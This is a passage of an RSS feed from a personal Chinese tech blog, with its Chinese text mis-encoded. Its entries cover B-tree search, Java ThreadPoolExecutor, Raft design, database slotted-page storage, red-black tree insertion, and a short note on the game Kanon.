&lt;p&gt;&lt;img src=&#34;https://sdttttt.github.io/DataStructure/BT.jpg&#34; alt=&#34;BT&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;å¦‚ä¸Šå›¾æˆ‘è¦ä»ä¸Šå›¾ä¸­æ‰¾åˆ°Eå­—æ¯ï¼ŒæŸ¥æ‰¾æµç¨‹å¦‚ä¸‹:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;è·å–æ ¹èŠ‚ç‚¹çš„å…³é”®å­—è¿›è¡Œæ¯”è¾ƒï¼Œå½“å‰æ ¹èŠ‚ç‚¹å…³é”®å­—ä¸ºMï¼ŒE&amp;lt;M(26ä¸ªå­—æ¯é¡ºåº)ï¼Œæ‰€ä»¥å¾€æ‰¾åˆ°æŒ‡å‘å·¦è¾¹çš„å­èŠ‚ç‚¹(äºŒåˆ†æ³•è§„åˆ™ï¼Œå·¦å°å³å¤§ï¼Œå·¦è¾¹æ”¾å°äºå½“å‰èŠ‚ç‚¹å€¼çš„å­èŠ‚ç‚¹ã€å³è¾¹æ”¾å¤§äºå½“å‰èŠ‚ç‚¹å€¼çš„å­èŠ‚ç‚¹)ï¼›&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ‹¿åˆ°å…³é”®å­—Då’ŒGï¼ŒD&amp;lt;E&amp;lt;G æ‰€ä»¥ç›´æ¥æ‰¾åˆ°Då’ŒGä¸­é—´çš„èŠ‚ç‚¹ï¼›&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ‹¿åˆ°Eå’ŒFï¼Œå› ä¸ºE=E æ‰€ä»¥ç›´æ¥è¿”å›å…³é”®å­—å’ŒæŒ‡é’ˆä¿¡æ¯(å¦‚æœæ ‘ç»“æ„é‡Œé¢æ²¡æœ‰åŒ…å«æ‰€è¦æŸ¥æ‰¾çš„èŠ‚ç‚¹åˆ™è¿”å›null).&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;insert&#34;&gt;Insert&lt;/h3&gt;
&lt;p&gt;ä¸‹æ¬¡æ›´æ–°.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Blog Upgrade</title>
        <link>https://sdttttt.github.io/p/blog-upgrade/</link>
        <pubDate>Sat, 29 Aug 2020 18:07:48 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/blog-upgrade/</guid>
        <description>&lt;p&gt;è¿™å‡ å¤©ä¿®æ”¹äº†è¿™ä¸ªBlogçš„ä¸»é¢˜, åŠ è½½é€Ÿåº¦åº”è¯¥æ˜¯æ›´å¿«äº†, è€Œä¸”ä¼˜åŒ–äº†æ•´ä¸ªé¡¹ç›®çš„è‡ªåŠ¨éƒ¨ç½². å–æ¶ˆäº†åŒä»“åº“çš„éƒ¨ç½²ç­–ç•¥, åœ¨éƒ¨ç½²ä»»åŠ¡çš„æ‰§è¡Œä¸Šä¹Ÿç”¨ä¸Šäº†å¼‚æ­¥.&lt;/p&gt;
&lt;p&gt;ç°åœ¨æ¯æ¬¡ä¿®æ”¹å®Œæˆåçš„ç”Ÿæˆä»¥åŠéƒ¨ç½²çš„é€Ÿåº¦æ¯”ä»¥å‰å¿«äº†å¤§æ¦‚40%å·¦å³.ä½†æ˜¯è®¿é—®&lt;strong&gt;Github Page&lt;/strong&gt;çš„é€Ÿåº¦è¿˜æ˜¯ä¸€å¦‚æ—¢å¾€çš„çš„æ»¡.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Thread Pool Executor è¿è¡Œç»†èŠ‚</title>
        <link>https://sdttttt.github.io/p/thread-pool-executor-%E8%BF%90%E8%A1%8C%E7%BB%86%E8%8A%82/</link>
        <pubDate>Tue, 25 Aug 2020 17:29:15 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/thread-pool-executor-%E8%BF%90%E8%A1%8C%E7%BB%86%E8%8A%82/</guid>
        <description>&lt;p&gt;å…ˆè¯´è¯´çº¿ç¨‹æ± æœ¬èº«, ç”±äºçº¿ç¨‹èµ„æºæœ¬èº«åœ¨è®¡ç®—æœºä¸­æ¯”è¾ƒæ˜‚è´µ, åˆ›å»ºå’Œé”€æ¯éƒ½æœ‰ç›¸å½“çš„å¼€é”€, æ‰€ä»¥åœ¨ä¸€äº›å¤„ç†ç®€å•ä½†æ˜¯å¹¶å‘é‡å¤§çš„åœºæ™¯ä½¿ç”¨ä¸€ä¸ªè¯·æ±‚å¯¹åº”ä¸€ä¸ªçº¿ç¨‹çš„æ˜¯ä¸æ˜æ™ºçš„é€‰æ‹©.&lt;/p&gt;
&lt;p&gt;ThreadPoolExecutoræ˜¯Javaä¸­çº¿ç¨‹æ± çš„ä¸€ç§å®ç°. æ„é€ å‡½æ•°å¦‚ä¸‹:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;ThreadPoolExecutor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;corePoolSize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// æ ¸å¿ƒçº¿ç¨‹æ•°é‡
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                              &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;maximumPoolSize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// æœ€å¤§çº¿ç¨‹æ•°é‡
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                              &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keepAliveTime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// å­˜æ´»æ—¶é—´
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                              &lt;span class=&#34;n&#34;&gt;TimeUnit&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// æ—¶é—´å•ä½
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                              &lt;span class=&#34;n&#34;&gt;BlockingQueue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Runnable&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;workQueue&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// æ¥ä¸ªåˆ—é˜Ÿ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                        &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;corePoolSize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;maximumPoolSize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keepAliveTime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;workQueue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;
             &lt;span class=&#34;n&#34;&gt;Executors&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;defaultThreadFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;defaultHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æäº¤ä»»åŠ¡æ—¶çš„è¿è¡Œå¦‚ä¸‹:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¦‚æœæ­£åœ¨è¿è¡Œçš„çº¿ç¨‹æ•° &amp;lt; coreSizeï¼Œé©¬ä¸Šåˆ›å»ºçº¿ç¨‹æ‰§è¡Œè¯¥taskï¼Œä¸æ’é˜Ÿç­‰å¾…ï¼›&lt;/li&gt;
&lt;li&gt;å¦‚æœæ­£åœ¨è¿è¡Œçš„çº¿ç¨‹æ•° &amp;gt;= coreSizeï¼ŒæŠŠè¯¥taskæ”¾å…¥é˜»å¡é˜Ÿåˆ—ï¼›&lt;/li&gt;
&lt;li&gt;å¦‚æœé˜Ÿåˆ—å·²æ»¡ &amp;amp;&amp;amp; æ­£åœ¨è¿è¡Œçš„çº¿ç¨‹æ•° &amp;lt; maximumPoolSizeï¼Œåˆ›å»ºæ–°çš„çº¿ç¨‹æ‰§è¡Œè¯¥taskï¼›&lt;/li&gt;
&lt;li&gt;å¦‚æœé˜Ÿåˆ—å·²æ»¡ &amp;amp;&amp;amp; æ­£åœ¨è¿è¡Œçš„çº¿ç¨‹æ•° &amp;gt;= maximumPoolSizeï¼Œçº¿ç¨‹æ± è°ƒç”¨handlerçš„rejectæ–¹æ³•æ‹’ç»æœ¬æ¬¡æäº¤ã€‚&lt;/li&gt;
&lt;li&gt;ä»workerçº¿ç¨‹è‡ªå·±çš„è§’åº¦æ¥çœ‹ï¼Œå½“workerçš„taskæ‰§è¡Œç»“æŸä¹‹åï¼Œå¾ªç¯ä»é˜»å¡é˜Ÿåˆ—ä¸­å–å‡ºä»»åŠ¡æ‰§è¡Œã€‚&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Raftå®ç°çš„æ€è€ƒ</title>
        <link>https://sdttttt.github.io/p/raft%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%80%9D%E8%80%83/</link>
        <pubDate>Thu, 25 Jun 2020 19:02:23 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/raft%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%80%9D%E8%80%83/</guid>
        <description>&lt;p&gt;æ¯”è¾ƒRaftç®—æ³•å’ŒPaxosç®—æ³•ä¹‹å,ç¡®å®èƒ½æ„Ÿå—åˆ°Raftç®—æ³•æ›´åŠ æ¥è¿‘æ­£å¸¸äººçš„æ€ç»´é€»è¾‘, Paxosåè€Œæ¯”è¾ƒ&lt;code&gt;ä¸“ä¸š?&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æœ¬æ–‡ä¼šè¯´ä¸€äº›Raftç®—æ³•å®ç°ä¸Šçš„ä¸€äº›è€ƒé‡, æˆ‘ç›®å‰è¿˜æ²¡æœ‰æ­£å¼å¼€å§‹å¼€å‘Raftçš„å®ç°.
æ–‡ä¸­æ‰€æœ‰çš„å†…å®¹ä»…ä¾›å‚è€ƒ.&lt;/p&gt;
&lt;p&gt;Raftæœ€åŸºç¡€åˆ†ä¸ºä¸‰ç§çŠ¶æ€: &lt;strong&gt;Leader&lt;/strong&gt;, &lt;strong&gt;Follower&lt;/strong&gt;, &lt;strong&gt;Candidate&lt;/strong&gt;.
æ•´ä¸ªRaftä¸»ä½“å³æ˜¯ä¸€ä¸ªçŠ¶æ€æœº.&lt;/p&gt;
&lt;p&gt;æ¯ä¸ªRaftNodeéƒ½éœ€è¦å¤„ç†å¤–éƒ¨çš„äº‹ä»¶.æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨äº‹ä»¶é©±åŠ¨æ¨¡å‹.&lt;/p&gt;
&lt;p&gt;æ•´ä½“æˆ‘ä»¬å¯ä»¥æ‹†åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RaftProcessor: å¤„ç†äº‹ä»¶çš„å¤„ç†å™¨.&lt;/li&gt;
&lt;li&gt;EventDispatcher: è´Ÿè´£æ¥æ”¶å¤–éƒ¨ä»»åŠ¡,å‘é€ç»™Raftæœ¬ä½“, æˆ–è€…æ¥æ”¶Raftæœ¬ä½“å‘æ¥çš„äº‹ä»¶,å‘å¤–å‘å¸ƒ.&lt;/li&gt;
&lt;li&gt;LogSynchronizer: åŒæ­¥LogBufferä¸­çš„æ—¥å¿—åˆ°Raftæœ¬ä½“.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¸‰ä¸ªéƒ¨åˆ†å¯ä»¥ä½¿ç”¨Channelæ¥åˆ°è¾¾äº’ç›¸é€šä¿¡.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://static01.imgkr.com/temp/4b34da085c8742018791aa36e4921210.jpg&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Kanon</title>
        <link>https://sdttttt.github.io/p/kanon/</link>
        <pubDate>Fri, 12 Jun 2020 17:09:04 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/kanon/</guid>
        <description>&lt;!-- raw HTML omitted --&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;æœ‰ä¸€æ®µæ—¶é—´æ²¡æœ‰ç©è¿‡&lt;code&gt;GALGAME&lt;/code&gt;äº†.&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥å°±å»å°è¯•ç©äº†&lt;code&gt;Kanon&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;æ€»ä¹‹å°±æ˜¯, &lt;strong&gt;éå¸¸åæ‚”&lt;/strong&gt;.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Database Storage</title>
        <link>https://sdttttt.github.io/p/database-storage/</link>
        <pubDate>Tue, 02 Jun 2020 19:51:50 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/database-storage/</guid>
        <description>&lt;p&gt;&lt;strong&gt;CMU Database System 15-445/645&lt;/strong&gt; å‚¨å­˜ Part 1&lt;/p&gt;
&lt;p&gt;æ•°æ®åº“å­˜å‚¨çš„æ•°æ®åœ¨ FS(File System) ä¸­æ˜¯ä»¥ &lt;strong&gt;å—(Block)&lt;/strong&gt; çš„æ–¹å¼è¡¨ç¤ºçš„.&lt;/p&gt;
&lt;p&gt;å®é™…ä¸Šä½ å¾ˆå¯èƒ½å·²ç»è§åˆ°è¿‡äº†,åœ¨MySQLä¸­çš„æ•°æ®åº“å°±æ˜¯ä»¥ä¸€åˆ‡Blockæ–‡ä»¶çš„æ–¹å¼å­˜å‚¨çš„.&lt;/p&gt;
&lt;p&gt;è¿™ç¯‡æ–‡ç« ä¼šå‘Šè¯‰ä½ ç›®å‰å¸¸è§çš„æ•°æ®åº“å­˜å‚¨æ–¹å¼.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;æœ€å¼€å§‹ç”¨&lt;strong&gt;Tuple Storage&lt;/strong&gt;æ¥å°è¯•æ”¹å–„æ•°æ®åº“çš„å­˜å‚¨ç»“æ„.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgkr.cn-bj.ufileos.com/0029ea52-6d5b-4989-a8e0-a7dec2e0d49c.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;å®ƒçš„å·¥ä½œåŸç†æ¯”è¾ƒç®€å•, æ¯ä¸€ä¸ª&lt;strong&gt;Page&lt;/strong&gt;ç»´æŠ¤ä¸€ä¸ª&lt;strong&gt;Header&lt;/strong&gt;,
Headerä¸­ä¼šåŒ…å«ä¸€äº›Pageçš„å…ƒæ•°æ®,ä»¥åŠè¢«å­˜å‚¨æ•°æ®çš„åç§»å€¼.&lt;/p&gt;
&lt;p&gt;æ¯å½“æ’å…¥ä¸€ä¸ªTuple,æˆ‘ä»¬å°±ä¼šUpdate Headerä¸­çš„åç§»å€¼.&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªè®¾è®¡ä¸­å­˜åœ¨æ¯”è¾ƒå¤§çš„é—®é¢˜, å¦‚æœæˆ‘ä»¬åˆ é™¤äº†åº•ä¸‹Tuple,å°±ä¸å¾—ä¸ç§»åŠ¨æ‰€æœ‰Tuple.
å¦‚æœä¸ç§»åŠ¨æ•°æ®, é‚£æˆ‘ä»¬ä¹Ÿè¦èŠ±è´¹é«˜æ˜‚çš„ä»£ä»·å»ç»´æŠ¤Headerä¸­Pageçš„metaæ•°æ®.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;ç›®å‰æœ€å¸¸è§çš„å°±æ˜¯&lt;strong&gt;Slotted Pages&lt;/strong&gt;çš„æ–¹å¼å»å­˜å‚¨æ•°æ®.
åœ¨ä¸åŒæ•°æ®åº“ä¸­çš„å®ç°ç»†èŠ‚å¯èƒ½ä¸åŒ,ä½†æ˜¯ä»é«˜çº§å±‚é¢æ¥è®²,å¤§å¤šæ•°æ•°æ®åº“ç³»ç»Ÿ,
ç”¨çš„éƒ½æ˜¯è¿™ç§æ–¹å¼å»å­˜å‚¨æ•°æ®.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgkr.cn-bj.ufileos.com/a47909a8-e0e6-48ea-a0b7-e3e327d7fdf2.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;æ¯ä¸ªPageä¸­æœ‰ä¸‰ä¸ªéƒ¨åˆ†:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Header&lt;/strong&gt;: ä¿å­˜æœ€åŸºæœ¬çš„matedata, è¿˜åŒ…å«ä¸€äº›checksumå’Œè®¿é—®æ—¶é—´ä¹‹ç±»çš„.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SlotArray&lt;/strong&gt;: å°†æ¯ä¸€ä¸ªç‰¹å®šçš„Slotæ˜ å°„åˆ°å¯¹åº”Tupleçš„åç§»å€¼ä¸Š.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;TupleArray&lt;/strong&gt;: å‚¨å­˜æ¯ä¸€ä¸ªTuple.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åœ¨è¿™ä¸ªç»“æ„ä¸­Headeråé¢ç´§æ¥è¿™SoltArray, è€ŒTupleæ˜¯ä»Pageçš„å°¾éƒ¨å¼€å§‹å­˜å‚¨çš„.
æ¯ä¸ªPageå­˜å‚¨çš„Tupleçš„ä¸ªæ•°æ˜¯å›ºå®šçš„.&lt;/p&gt;
&lt;p&gt;å¦‚æœTupleè¢«åˆ é™¤,æˆ‘ä»¬ä¹Ÿåªéœ€è¦åˆ é™¤å›ºå®šçš„Soltå°±è¡Œ.
ç©ºå‡ºæ¥çš„ç©ºé—´ç¢ç‰‡,å¯ä»¥ç”±æ•°æ®åº“çš„ç©ºé—´æ•´ç†åŠŸèƒ½å»å®Œæˆ.
ç»´æŠ¤æ¯ä¸ªTupleçš„æˆæœ¬ä¹Ÿæ¯”è¾ƒå°.åªéœ€è¦æ”¹å˜Soltå°±å¯ä»¥.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;æœ€åè®²ä¸€ä¸ªDemoæ¥æ¼”ç¤ºæ•°æ®åº“çš„å·¥ä½œè¿‡ç¨‹.&lt;/p&gt;
&lt;p&gt;å‡å¦‚æˆ‘æƒ³è¦æ‰¾ä¸€ä¸ªå«Açš„äºº,æˆ‘ä¼šå…ˆå»æŸ¥æ‰¾ç´¢å¼•.
ä»ç´¢å¼•é‡Œæˆ‘çŸ¥é“Açš„Pageæ˜¯123, Soltæ˜¯2.
æˆ‘å»æ‰¾ç®¡ç†Pagesçš„äºº,è®©ä»–æŠŠPage123çš„æŒ‡é’ˆç»™æˆ‘,
ç„¶åæ‹¿ç€Pageçš„æŒ‡é’ˆ,æ‰¾åˆ°Solt2ä¸­çš„åç§»åœ°å€,æ‰¾åˆ°äº†Aè¿™ä¸ªäºº.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Red Black Tree</title>
        <link>https://sdttttt.github.io/p/red-black-tree/</link>
        <pubDate>Mon, 25 May 2020 19:27:28 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/red-black-tree/</guid>
        <description>&lt;p&gt;åŠå¹´å‰åœ¨ç ”ç©¶&lt;code&gt;HashMap&lt;/code&gt;çš„æ—¶å€™å·²ç»å­¦ä¹ è¿‡çº¢é»‘æ ‘çš„è§„åˆ™åŸç†äº†.
ä¸è¿‡ç°åœ¨åˆé‡åˆ°å°±å¿˜è®°æ˜¯æ€ä¹ˆå®ç°çš„äº†.(åªçŸ¥é“è¿™ç©æ„æ˜¯ç”¨æ¥å¹³è¡¡æ ‘çš„)
è¿™æ¬¡å°±æŠŠè¿™ä¸ªæ•°æ®ç»“æ„åšä¸€ä¸ªäº†æ–­.&lt;/p&gt;
&lt;h3 id=&#34;æ€§è´¨&#34;&gt;æ€§è´¨&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;æ€§è´¨1ï¼šæ¯ä¸ªèŠ‚ç‚¹è¦ä¹ˆæ˜¯é»‘è‰²ï¼Œè¦ä¹ˆæ˜¯çº¢è‰²ã€‚&lt;/li&gt;
&lt;li&gt;æ€§è´¨2ï¼šæ ¹èŠ‚ç‚¹æ˜¯é»‘è‰²ã€‚&lt;/li&gt;
&lt;li&gt;æ€§è´¨3ï¼šæ¯ä¸ªå¶å­èŠ‚ç‚¹ï¼ˆNILï¼‰æ˜¯é»‘è‰²ã€‚&lt;/li&gt;
&lt;li&gt;æ€§è´¨4ï¼šæ¯ä¸ªçº¢è‰²ç»“ç‚¹çš„ä¸¤ä¸ªå­ç»“ç‚¹ä¸€å®šéƒ½æ˜¯é»‘è‰²ã€‚&lt;/li&gt;
&lt;li&gt;æ€§è´¨5ï¼šä»»æ„ä¸€ç»“ç‚¹åˆ°æ¯ä¸ªå¶å­ç»“ç‚¹çš„è·¯å¾„éƒ½åŒ…å«æ•°é‡ç›¸åŒçš„é»‘ç»“ç‚¹ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ»¡è¶³è¿™5ä¸ªæ€§è´¨å°±èƒ½ä¿è¯çº¢é»‘æ ‘æ˜¯å¹³è¡¡çš„.&lt;/p&gt;
&lt;h3 id=&#34;insert&#34;&gt;Insert&lt;/h3&gt;
&lt;p&gt;æ’å…¥çš„èŠ‚ç‚¹é»˜è®¤æ˜¯çº¢è‰²çš„.å› ä¸ºè¿™æ ·å¯ä»¥æœ€å¤§é™åº¦æ»¡è¶³çº¢é»‘æ ‘çš„5ä¸ªæ€§è´¨.&lt;/p&gt;
&lt;p&gt;è¯·è¯•æƒ³ä¸€ä¸‹.å¦‚æœæ’å…¥çš„èŠ‚ç‚¹æ˜¯çº¢è‰²:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ€§è´¨1å¯ä»¥æ»¡è¶³.&lt;/li&gt;
&lt;li&gt;æ€§è´¨2å¯ä»¥æ»¡è¶³.&lt;/li&gt;
&lt;li&gt;æ€§è´¨3å¯ä»¥æ»¡è¶³(æ’å…¥çº¢è‰²èŠ‚ç‚¹åè‡ªåŠ¨è¡ç”Ÿå‡º2ä¸ªé»‘è‰²çš„NILèŠ‚ç‚¹).&lt;/li&gt;
&lt;li&gt;æ€§è´¨4å¯èƒ½æ²¡æ³•æ»¡è¶³(æ–°æ’å…¥çš„èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ä¹Ÿæ˜¯çº¢è‰²).&lt;/li&gt;
&lt;li&gt;æ€§è´¨5å¯èƒ½æ²¡æ³•æ»¡è¶³(çˆ¶èŠ‚ç‚¹æ˜¯é»‘è‰²æ—¶å°±ä¸è¡Œ).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç„¶åæ˜¯çº¢é»‘æ ‘èŠ‚ç‚¹çš„å·¦å³æ—‹.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/sdttttt/images/raw/master//1323444-ff870251222c460e.gif&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/sdttttt/images/raw/master//1323444-3f68be339d2a3983.gif&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;çœ‹æ‡‚æ²¡? èŠ‚ç‚¹çš„æ—‹è½¬å¤§æ¦‚å°±æ˜¯è¿™æ ·ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åå°±æ˜¯è¦åˆ†æ’å…¥çš„æƒ…å†µäº†.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ç¬¬ä¸€ç§ï¼šæ ¹èŠ‚ç‚¹ä¸ºç©ºã€‚è¿™ç§æƒ…å†µï¼Œå°†nodeçš„é¢œè‰²æ”¹ä¸ºé»‘è‰²å³å¯.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç¬¬äºŒç§: nodeçš„çˆ¶èŠ‚ç‚¹ä¸ºé»‘è‰²ã€‚è¿™ç§æƒ…å†µä¸éœ€è¦åšä¿®æ”¹.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç¬¬ä¸‰ç§: nodeçš„çˆ¶èŠ‚ç‚¹ä¸ºçº¢è‰² (æ ¹æ®æ€§è´¨3ï¼ŒNçš„ç¥–çˆ¶èŠ‚ç‚¹å¿…ä¸ºé»‘è‰²). è¿™ç§æƒ…å†µå’Œå˜æ¢è§„åˆ™éƒ½æ¯”è¾ƒå¤š.ä¸‹é¢ç»†è¯´&amp;hellip;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;nodeçš„å”çˆ¶èŠ‚ç‚¹ä¸ºçº¢è‰²ã€‚è¿™ç§æƒ…å†µï¼Œå°†Nçš„çˆ¶èŠ‚ç‚¹å’Œå”çˆ¶èŠ‚ç‚¹çš„é¢œè‰²éƒ½æ”¹ä¸ºé»‘è‰²ï¼Œè‹¥ç¥–çˆ¶èŠ‚ç‚¹æ˜¯è·ŸèŠ‚ç‚¹å°±å°†å…¶æ”¹ä¸ºé»‘è‰²ï¼Œå¦åˆ™å°†å…¶é¢œè‰²æ”¹ä¸ºçº¢è‰²ï¼Œå¹¶ä»¥ç¥–çˆ¶èŠ‚ç‚¹ä¸ºæ’å…¥çš„ç›®æ ‡èŠ‚ç‚¹å¼€å§‹é‡æ–°é€’å½’ä¿®å¤çº¢é»‘æ ‘.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/sdttttt/images/raw/master//Red-black_tree_insert_case_3.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;nodeçš„å”çˆ¶èŠ‚ç‚¹ä¸ºé»‘è‰²ï¼Œä¸”nodeå’Œnodeçš„çˆ¶èŠ‚ç‚¹åœ¨åŒä¸€è¾¹ (å³çˆ¶èŠ‚ç‚¹ä¸ºç¥–çˆ¶çš„å·¦å„¿å­æ—¶ï¼ŒNä¹Ÿæ˜¯çˆ¶èŠ‚ç‚¹çš„å·¦å„¿å­ã€‚çˆ¶èŠ‚ç‚¹ä¸ºç¥–çˆ¶èŠ‚ç‚¹çš„å³å„¿å­æ—¶ã€‚Nä¹Ÿæ˜¯çˆ¶èŠ‚ç‚¹çš„å³å„¿å­)ã€‚ä»¥çˆ¶èŠ‚ç‚¹ä¸ºç¥–çˆ¶èŠ‚çš„å·¦å„¿å­ä¸ºä¾‹ï¼Œå°†çˆ¶èŠ‚ç‚¹æ”¹ä¸ºé»‘è‰²ï¼Œç¥–çˆ¶èŠ‚ç‚¹æ”¹ä¸ºçº¢è‰²ï¼Œç„¶åä»¥ç¥–çˆ¶èŠ‚ç‚¹ä¸ºåŸºå‡†å³æ—‹ã€‚(Nä¸ºçˆ¶èŠ‚ç‚¹å³å„¿å­æ—¶åšç›¸åº”çš„å·¦æ—‹)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/sdttttt/images/raw/master//Red-black_tree_insert_case_5.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;ul&gt;
